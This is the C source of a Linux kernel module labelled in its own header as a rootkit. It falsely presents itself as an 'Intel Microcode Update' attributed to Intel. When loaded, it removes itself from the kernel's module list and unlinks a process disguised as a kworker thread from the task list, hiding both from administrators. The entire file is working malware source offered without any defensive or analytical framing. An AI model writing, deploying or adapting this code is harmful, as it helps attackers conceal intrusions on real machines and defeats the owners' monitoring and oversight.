/*
 * SPECTRE V6 GOLD MASTER - ROOTKIT
 * Target: Linux 5.x / 6.x
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/rculist.h>
#include <linux/string.h>
#include <linux/rcupdate.h>
#include <linux/sched/task.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Intel");
MODULE_DESCRIPTION("Intel Microcode Update");

#define TARGET_COMM "[kworker/u4:0-events]"

void hide_process_rcu(void) {
    struct task_struct *task;
    struct task_struct *target = NULL;
    rcu_read_lock();
    for_each_process(task) {
        if (strcmp(task->comm, TARGET_COMM) == 0) {
            target = task;
            get_task_struct(target); 
            break;
        }
    }
    rcu_read_unlock();
    if (target) {
        list_del_rcu(&target->tasks);
        synchronize_rcu();
        put_task_struct(target);
    }
}

void hide_module(void) {
    list_del_rcu(&THIS_MODULE->list);
    synchronize_rcu();
}

static int __init spectre_init(void) {
    hide_module();
    hide_process_rcu();
    return 0;
}

static void __exit spectre_exit(void) {}

module_init(spectre_init);
module_exit(spectre_exit);
